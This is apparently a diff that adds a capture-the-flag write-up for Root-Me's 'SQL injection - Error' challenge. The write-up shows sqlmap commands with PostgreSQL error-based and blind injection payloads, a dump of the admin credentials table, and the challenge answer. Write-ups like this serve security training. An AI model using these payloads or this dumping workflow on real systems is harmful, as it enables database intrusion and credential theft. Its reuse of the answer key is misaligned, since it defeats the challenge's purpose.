@@ -66,7 +66,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 58. [Local File Inclusion - Wrappers](#local-file-inclusion-wrappers)
 59. [PHP - Eval](#php-eval)
 60. [PHP - Unserialize overflow](#php-unserialize-overflow)
-61. [SQL injection - Error](#sql-injection-error)
+61. [SQL injection - Error](#sql-injection-error) 🗸
 62. [SQL injection - Insert](#sql-injection-insert)
 63. [SQL injection - File reading](#sql-injection-file-reading)
 64. [XPath injection - String](#xpath-injection-string)
@@ -3602,6 +3602,116 @@ This provides the password details in the source code of the website.
 
 ~~~
 SWRwehpkTI3Vu2F9DoTJJ0LBO
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## SQL injection Error
+
+- Author: sambecks
+- Date: 4 March 2015
+- Points: 40
+- Level: 3
+
+### Statement
+
+Retrieve Administrators Password.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch34/).
+
+### Resources
+
+1. [FAST blind SQL Injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20FAST%20blind%20SQL%20Injection.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website we find two webpages:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch34/?action=login
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC
+~~~
+
+Using SQLmap we can automate the injection process:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --batch --banner
+...
+---
+Parameter: order (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause
+    Payload: action=contents&order=ASC,(SELECT (CASE WHEN (1129=1129) THEN 1 ELSE 1/(SELECT 0) END))
+
+    Type: error-based
+    Title: PostgreSQL error-based - ORDER BY, GROUP BY clause
+    Payload: action=contents&order=ASC,(CAST((CHR(113)||CHR(98)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7494=7494) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(122)||CHR(98)||CHR(113)) AS NUMERIC))
+---
+~~~
+
+This first batch command identifies the injection vulnerability.  We can delve deeper into the database using the -dbs flag:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --batch --dbs
+...
+available databases [3]:
+[*] information_schema
+[*] pg_catalog
+[*] public
+...
+~~~
+
+We can interrogate the public database:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --batch --tables -D public
+...
+Database: public
+[2 tables]
++--------------+
+| contents     |
+| m3mbr35t4bl3 |
++--------------+
+...
+~~~
+
+Finally, dumping the table we can get the user details including admin password:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --batch --dump -T m3mbr35t4bl3 -D public
+...
+Database: public
+Table: m3mbr35t4bl3
+[1 entry]
++----+-----------------+----------------------+--------------+
+| id | em41l_c0l       | p455w0rd_c0l         | us3rn4m3_c0l |
++----+-----------------+----------------------+--------------+
+| 1  | admin@localhost | 1a2BdKT5DIx3qxQN3UaC | admin        |
++----+-----------------+----------------------+--------------+
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+1a2BdKT5DIx3qxQN3UaC
 ~~~
 
 </details>
